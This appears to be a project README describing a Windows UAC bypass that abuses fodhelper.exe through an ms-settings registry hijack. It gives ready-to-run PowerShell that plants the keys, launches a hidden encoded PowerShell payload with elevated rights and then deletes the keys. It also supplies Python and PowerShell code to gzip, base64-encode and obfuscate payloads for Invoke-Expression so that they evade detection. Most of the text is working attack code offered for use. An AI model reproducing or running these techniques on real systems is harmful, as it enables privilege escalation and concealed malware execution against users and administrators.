# Theory

> Unlock hidden doors with trust as your key

### Vulnerability

fodhelper.exe itself does not execute registry keys per se; However, it reads certain registry keys to determine its behavior. By misusing the "ms-settings" key, we can potentially get fodhelper to run values within a key

fodhelper.exe is designed to run with elevated privileges without prompting the user with a uac

### Raw Payload

```Powershell
$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command"
reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f

fodhelper.exe

Start-Sleep -s 3
reg delete "HKCU\Software\Classes\.hacker\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
or
```Powershell
$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.hacker\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
```

### Encryption and Encode

<b>I know it's corny, but compression is a form of encryption</b>

We want to compress and encode this command to where powershell can decompress

Compression often generates unwanted characters, so we will also encode after compressing

```python
# Please forgive me, I hate leaving comments
# The code should speak for itself

import gzip

def compress_and_base64(input):
    # Convert string to bytes
    bytes = input.encode('utf-8')

    # Initialize buffer
    buffer = io.BytesIO()

    # Compress stream with gzip
    with gzip.GzipFile(fileobj=buffer, mode='wb') as file:
        file.write(bytes)

    # Save stream to variable
    compressed = buffer.getvalue()

    # Encode, so invisble characters are saved
    encoded = base64.b64encode(compressed)

    # Convert bytes to string
    return encoded.decode('utf-8')
```

<b>Extraction Method</b>

```powershell
# Decode and Decompress
# Output will be a string

(New-Object IO.Compression.GZipStream(
    # Decode
    [System.IO.MemoryStream][Convert]::FromBase64String($COMPRESSED_DATA_HERE),

    # Decompress stream with gzip
    [System.IO.Compression.CompressionMode]::Decompress
) |

# % is shorthand for "foreach-object"
%{

    # Read from gzip stream, convert to ascii
    New-Object System.IO.StreamReader($_, [System.Text.Encoding]::ASCII)

# Convert all to single string
}).ReadToEnd() 
```

or

```powershell
(New-Object IO.Compression.GZipStream([System.IO.MemoryStream][Convert]::FromBase64String($COMPRESSED_DATA_HERE), [System.IO.Compression.CompressionMode]::Decompress) |%{New-Object System.IO.StreamReader($_, [System.Text.Encoding]::ASCII)}).ReadToEnd()
```

### Powershell Obfuscation Methods
<p>Numeric to string conversion obfuscation</p>
<p>Character code obfuscation</p>
<p>String slicing and indexing obfuscation</p>

```powershell
# NUMERIC CONVERSION -> Write-Host 420
[string]::join('',((87,114,105,116,101,45,72,111,115,116,32,52,50,48)|%{[char]$_}))

# CHARACTER CODE -> Write-Host 420
[char](87)+[char](114)+[char](105)+[char](116)+[char](101)+[char](45)+[char](72)+[char](111)+[char](115)+[char](116)+[char](32)+[char](52)+[char](50)+[char](48)

# STRING SLICING -> Write-Host 420
"zttxirGVRskXrsEFIcH0X2cPLmO WnoruBWUks-f2neGJNIo46"[34,12,4,2,42,38,18,30,13,1,27,48,40,19] -join ""
```

### Match and Replace
<p>Because each method returns a string, we need to include either & and/or & Invoke-Expression</p>

```python
full_payload = r"$command = '" + encoded_command + r"';(& (\New-Object\) (\IO.Compression.GZipStream\)([System.IO.MemoryStream][Convert]::FromBase64String('" + compressed_base64 + r"'), [System.IO.Compression.CompressionMode]::Decompress) | % {(& (\New-Object\) (\System.IO.StreamReader\)($_, [System.Text.Encoding]::ASCII))}).(\ReadToEnd\)() | Invoke-Expression"

pattern = r"\\.+?\\"
```
